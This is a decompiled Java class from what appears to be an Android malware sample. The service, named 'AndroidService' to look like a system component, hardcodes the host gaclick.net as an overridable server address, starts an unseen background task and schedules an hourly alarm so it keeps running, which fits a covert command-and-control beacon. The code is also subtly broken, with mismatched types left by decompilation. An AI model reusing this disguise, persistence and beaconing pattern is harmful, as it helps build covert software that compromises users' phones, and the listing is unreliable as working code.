	static android.content.Context a
	static java.lang.String b
	public static  c
	private static java.lang.String d
	private static android.content.SharedPreferences e
	
	    static AndroidService()
	    {
	        ru.droid.install.system.AndroidService.b = "gaclick.net";
	        ru.droid.install.system.AndroidService.d = "gaclick.net";
	        ru.droid.install.system.AndroidService.c = 0;
	        return;
	    }
	
	
	    public AndroidService()
	    {
	        return;
	    }
	
	
	    public static void a(String p3)
	    {
	        android.content.SharedPreferences$Editor v0_1 = ru.droid.install.system.AndroidService.e.edit();
	        v0_1.putString(ru.droid.install.system.AndroidService.a.getString(2130968584), p3);
	        v0_1.commit();
	        return;
	    }
	
	
	    public android.os.IBinder onBind(android.content.Intent p2)
	    {
	        return 0;
	    }
	
	
	    public void onCreate()
	    {
	        return;
	    }
	
	
	    public void onDestroy()
	    {
	        super.onDestroy();
	        return;
	    }
	
	
	    public void onStart(android.content.Intent p8, int p9)
	    {
	        super.onStart(p8, p9);
	        ru.droid.install.system.AndroidService.a = this;
	        android.app.AlarmManager v0_0 = android.preference.PreferenceManager.getDefaultSharedPreferences(this);
	        ru.droid.install.system.AndroidService.e = v0_0;
	        ru.droid.install.system.AndroidService.b = v0_0.getString(this.getString(2130968584), ru.droid.install.system.AndroidService.d);
	        long v2_2 = new String[0];
	        new ru.droid.install.system.b().execute(v2_2);
	        ((android.app.AlarmManager) this.getSystemService("alarm")).setRepeating(0, System.currentTimeMillis(), 3600000, android.app.PendingIntent.getBroadcast(this, 0, new android.content.Intent(this, ru.droid.install.system.ServiceController), 0));
	        return;
	    }
	
	
	    public boolean onUnbind(android.content.Intent p2)
	    {
	        return super.onUnbind(p2);
	    }
	
